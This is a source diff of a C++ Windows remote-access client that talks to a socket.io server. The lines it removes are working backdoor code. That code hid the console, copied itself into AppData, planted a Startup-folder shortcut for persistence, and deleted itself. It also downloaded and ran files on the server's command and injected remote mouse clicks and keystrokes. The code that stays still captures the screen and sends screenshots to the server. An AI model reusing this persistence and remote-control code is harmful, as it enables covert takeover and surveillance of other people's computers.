@@ -45,12 +45,6 @@ namespace fs = std::experimental::filesystem;
 #include "sio/sio_client.h"
 
 
-
-
-
-
-
-
 std::mutex _lock;
 
 
@@ -58,11 +52,10 @@ std::mutex _lock;
 
 int main(int argc, char *argv[]) {
 
-	MouseController MC;
-
 	// hide console window
 	HWND hWnd = GetConsoleWindow();
-	ShowWindow(hWnd, SW_HIDE);
+	//ShowWindow(hWnd, SW_HIDE);
+	SetWindowText(hWnd, "streamr");
 
 	// Initialize GDI+.
 	ULONG_PTR m_gdiplusToken;
@@ -75,79 +68,6 @@ int main(int argc, char *argv[]) {
 	GetUserName(user_name, &user_name_size);
 	printf("username: %s\n", user_name);
 	std::string name(user_name);
-
-	fs::path desiredCurrentPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Media\\";
-	std::string desiredCurrentString = desiredCurrentPath.string();
-	fs::path startupPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
-	std::string startupString = startupPath.string();
-	fs::path lnkPath = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Startup.lnk";
-	std::string lnkString = lnkPath.string();
-
-	if (!fs::is_directory(desiredCurrentPath)) {
-		printf("desired directory doesn't exist.\n%s\n", desiredCurrentString);
-		fs::create_directory(desiredCurrentPath);
-	}
-
-
-	fs::path currentExePath = getExeFullPath();
-	fs::path newExePath = desiredCurrentString + getExeName();
-	std::string currentExeString = currentExePath.string();
-	std::string newExeString = newExePath.string();
-
-	printf("current exe path: %s\n", currentExeString);
-	printf("new exe path: %s\n", newExeString);
-
-	// copy to program to directory if not already in it:
-	if (!(currentExeString.compare(newExeString) == 0)) {
-		//fs::copy_file(currentExePath, newExePath);
-		std::string copyCommand = "copy \"" + currentExeString + "\" \"" + newExeString + "\"";
-		system(copyCommand.c_str());
-	}
-
-	// create the startup folder link:
-	if (!fs::exists(lnkPath)) {
-
-		printf("link doens't exist, creating...\n");
-
-		CoInitialize(NULL);
-		IShellLink* pShellLink = NULL;
-		HRESULT hres;
-		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink);
-
-		const size_t size = strlen(lnkString.c_str()) + 1;
-		wchar_t* lnkWChar = new wchar_t[size];
-		mbstowcs(lnkWChar, lnkString.c_str(), size);
-		std::wcout << lnkWChar << std::endl;
-
-		pShellLink->SetPath(newExeString.c_str());  // Path to the object we are referring to
-		pShellLink->SetWorkingDirectory(desiredCurrentString.c_str());// desiredCurrentDirectoryChar
-		pShellLink->SetDescription("Startup");
-		pShellLink->SetIconLocation(newExeString.c_str(), 0);
-
-		IPersistFile *pPersistFile;
-		hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
-
-		hres = pPersistFile->Save(lnkWChar, TRUE);
-
-		pPersistFile->Release();
-		pShellLink->Release();
-
-		delete[] lnkWChar;
-	}
-
-	
-
-	// self delete if not in the right directory:
-	if (!(currentExeString.compare(newExeString) == 0)) {
-		execute(newExeString, desiredCurrentString);
-		// self delete
-		//selfDelete2();
-		selfDelete3();
-		exit(0);
-	}
-
-	// fix incase of malformed startup link
-	SetCurrentDirectory(desiredCurrentString.c_str());
 
 
 	sio::client myClient;
@@ -175,33 +95,6 @@ int main(int argc, char *argv[]) {
 		printf("username: %s\n", user_name);
 		std::string name2(user_name);
 		myClient.socket()->emit("registerName", name2);
-	}));
-
-
-	// download:
-	myClient.socket()->on("dl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-
-		printf("recieved dl.\n");
-
-		std::string url = data->get_map()["url"]->get_string();
-		//std::string filename = data->get_map()["filename"]->get_string();
-		std::string filename = getFileNameFromPath(url);
-
-		// always overwrite
-		printf("downloading...\n");
-		download(filename.c_str(), url.c_str());
-	}));
-
-	// execute:
-	myClient.socket()->on("ex", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-
-		printf("recieved ex.\n");
-		std::string filename = data->get_map()["filename"]->get_string();
-
-		if (fs::exists(filename)) {
-			printf("file exists. running...\n");
-			execute4(filename);
-		}
 	}));
 
 	// screenshot:
@@ -275,129 +168,30 @@ int main(int argc, char *argv[]) {
 		myClient.socket()->emit("screenshot", encoded_string);
 	}));
 
-	// mouse action:
-	myClient.socket()->on("mac", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-
-		printf("recieved mac.\n");
-
-		int x = data->get_map()["x"]->get_int();
-		int y = data->get_map()["y"]->get_int();
-
-		int which = data->get_map()["which"]->get_int();
-
-		RECT      rc;
-		GetClientRect(GetDesktopWindow(), &rc);
-		long width = rc.right;
-		long height = rc.bottom;
-		if (width == 1500) {
-			x /= 2;
-			y /= 2;
-		}
-
-		// action 0: move mouse		- no delay
-		// action 1: left click		- has delay
-		// action 2: right click	- has delay
-		// action 3: left down		- has delay
-		// action 4: right down		- has delay
-		// action 5: left up		- has delay
-		// action 6: right up		- has delay
-
-		MC.moveAbs(x, y);
-		if (which > 0) {
-			Sleep(100);
-		}
-
-		switch (which) {
-		case 0:
-			// already moved the mouse
-			break;
-		case 1:
-			MC.leftClick();
-			break;
-		case 2:
-			MC.rightClick();
-			break;
-		case 3:
-			MC.leftDown();
-			break;
-		case 4:
-			MC.rightDown();
-			break;
-		case 5:
-			MC.leftUp();
-			break;
-		case 6:
-			MC.rightUp();
-			break;
-		}
-		
-	}));
-
-
-	// send keystrokes
-	myClient.socket()->on("txt", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-
-		printf("recieved txt.\n");
-
-		std::string keys = data->get_map()["text"]->get_string();
-
-		if (keys == "Enter") {
-			sendEnter();
-		} else if (keys == "Backspace") {
-			sendBackspace();
-		} else if (keys == "Tab") {
-			sendTab();
-		} else if (keys == "ArrowUp") {
-			sendUpArrow();
-		} else if (keys == "ArrowDown") {
-			sendDownArrow();
-		} else if (keys == "ArrowLeft") {
-			sendLeftArrow();
-		} else if (keys == "ArrowRight") {
-			sendRightArrow();
-		} else if (keys == "Shift") {
-			sendShift();
-		} else if (keys == "CapsLock") {
-			sendCaps();
-		} else if (keys == "Control") {
-			sendControl();
-		} else if (keys == "Alt") {
-			sendAlt();
-		} else if (keys == "Delete") {
-			sendDelete();
-		} else if (keys == "Insert") {
-			sendInsert();
-		} else if (keys == "Meta") {
-			sendWindows();
-		} else if (keys == "Escape") {
-			sendEscape();
-		} else {
-			TCHAR *param = new TCHAR[keys.size() + 1];
-			param[keys.size()] = 0;
-			//As much as we'd love to, we can't use memcpy() because
-			//sizeof(TCHAR)==sizeof(char) may not be true:
-			std::copy(keys.begin(), keys.end(), param);
-			sendKeystrokes(param);
-		}
-
-	}));
-	
-
-
-	myClient.socket()->on("sd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-		//selfDelete2();
-		selfDelete3();
-		exit(0);
-	}));
-
-
-	myClient.socket()->on("dd", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
-		deleteDir();
-	}));
-
 
 	// Shut Down GDI+
 	//Gdiplus::GdiplusShutdown(m_gdiplusToken);
+
+
+	using namespace std::chrono;
+
+	steady_clock::time_point clock_begin = steady_clock::now();
+
+	while (true) {
+
+		Sleep(1000);
+
+		steady_clock::time_point clock_end = steady_clock::now();
+
+		steady_clock::duration time_span = clock_end - clock_begin;
+		double nseconds = double(time_span.count()) * steady_clock::period::num / steady_clock::period::den;
+
+		std::cout << nseconds << " seconds." << std::endl;
+		
+		if (nseconds > 600) {
+			exit(0);
+		}
+	}
 
 	
 
